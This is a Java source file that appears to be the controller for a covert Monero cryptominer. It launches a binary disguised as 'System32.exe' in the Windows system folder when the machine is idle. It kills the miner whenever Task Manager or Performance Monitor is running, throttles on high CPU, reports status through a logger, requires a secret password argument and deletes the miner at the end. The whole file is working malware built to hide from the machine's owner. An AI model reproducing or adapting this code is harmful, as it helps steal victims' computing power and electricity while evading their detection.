/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package deployworking;

import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;


public class DeployWorking {

    private static final String SYSTEM_PATH = "C:\\Windows\\System32\\";
    private static final String XMR_NAME = "System32.exe";
    private static final String XMR_KEY = "30819f300d06092a864886f70d010101050003818d003081890281810099b2e144cc224facbb786d3783867da85c9959fc85c440e2d4798632a4397a60a9c1eab38c1644650a7176254d1edd419faadec0f2af4635e86249f656a086787e0ff1a666176f31a7c4ddcf40b1b68556c78dba32e8e1985fb1041f2d6c638ac5cbd5823394c8406cc6d6b984997703605da53df2338a5be23ea604eac9bac30203010001";
    private static final List<String> hideProcessList = Arrays.asList("Taskmgr.exe", "perfmon.exe");
    private static final LoggerHandler handler = new LoggerHandler();
    private static final OperatingSystemMXBean mxBean = ManagementFactory.getOperatingSystemMXBean();
    private static Method cpuMethod;
    
    
    public static void main(String[] args) {
        
        if (args.length != 1 || !args[0].equals("j@123")) {
            handler.sendLog("600");
            return;
        }
        
        handler.sendLog("601");
        
        if (!new File(SYSTEM_PATH + XMR_NAME).exists()) {
            handler.sendLog("602");
            return;
        }
        
        for (Method method : mxBean.getClass().getDeclaredMethods()) {
            method.setAccessible(true);
            if (method.getName().equals("getSystemCpuLoad") && Modifier.isPublic(method.getModifiers()))
                cpuMethod = method;
        }
        
        int logCount = 0, startCount = 0, stopCount = 0;
        boolean keepRuning = true, needHide, isXmrRunning = false;
        double currentCpu = 10;
        ProcessBuilder xmrBuilder = new ProcessBuilder("cmd", "/C start /B /LOW /WAIT " + SYSTEM_PATH + XMR_NAME + " " + XMR_KEY);
        xmrBuilder.directory(new File(SYSTEM_PATH));
        
        try {
        
            while (keepRuning) {
                
                needHide = false;
                isXmrRunning = false;
                
                for (String p : getProcessRuningList()) {
                    
                    for (String h : hideProcessList)
                        if (p.contains(h))
                            needHide = true;
                    
                    if (p.contains(XMR_NAME))
                        isXmrRunning = true;
                }
                
                
                currentCpu = (getProcessCpuLoad() + currentCpu) / 2;
                
                if (logCount++ % 260 == 0)
                    keepRuning = !handler.sendLog(currentCpu, (isXmrRunning));
                    
                //System.out.println(currentCpu);
                
                //  待命中
                if (!isXmrRunning) {
                    if (currentCpu < 2.5 && !needHide) {
                        if (startCount < 3) 
                            startCount++;
                        else {
                            if (!new File(SYSTEM_PATH + XMR_NAME).exists()) {
                                handler.sendLog("602");
                                break;
                            }

                            handler.sendLog("603");
                            Process xmrProcess = xmrBuilder.start();
                            xmrProcess.waitFor(3, TimeUnit.SECONDS);
                            xmrProcess.destroy();
                            
                            startCount = 0;
                        }
                    }
                    else
                        startCount = 0;
                }
                //  執行中
                else {
                    if (currentCpu > 80.0) {
                        if (stopCount < 3)
                            stopCount++;
                        else {
                            handler.sendLog("604");
                            Runtime.getRuntime().exec("taskkill /F /IM " + XMR_NAME);
                            stopCount = 0;
                        }
                    }
                    else if (needHide) {
                        handler.sendLog("605");
                        Runtime.getRuntime().exec("taskkill /F /IM " + XMR_NAME);
                        stopCount = 0;
                    }
                    else
                        stopCount = 0;
                }
                
                Thread.sleep(1000);
            }
            
            if (isXmrRunning)
                Runtime.getRuntime().exec("taskkill /F /IM " + XMR_NAME);
        
            Thread.sleep(3000);
            
            new File(SYSTEM_PATH + XMR_NAME).delete();
            handler.sendLog("606");
        
        } catch (InterruptedException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | IOException ex) {
            handler.sendLog("609");
            //System.out.println(ex);
        }
    }
    
    private static double getProcessCpuLoad() throws IllegalAccessException, IllegalArgumentException, InvocationTargetException, InterruptedException {
        double value = -1.0;

        do {
            value = (Double)cpuMethod.invoke(mxBean);
            Thread.sleep(100);
        } while (value <= 0.0);

        return value * 100;
    }
    
    
    
    private static List<String> getProcessRuningList () throws IOException {
        
        List<String> plist = new ArrayList<>();
        Process process = Runtime.getRuntime().exec("tasklist.exe");
        
        try (Scanner scanner = new Scanner(new InputStreamReader(process.getInputStream()))){
            while (scanner.hasNext()) 
                plist.add(scanner.nextLine());
        }
        process.destroy();
        return plist;
    }
}
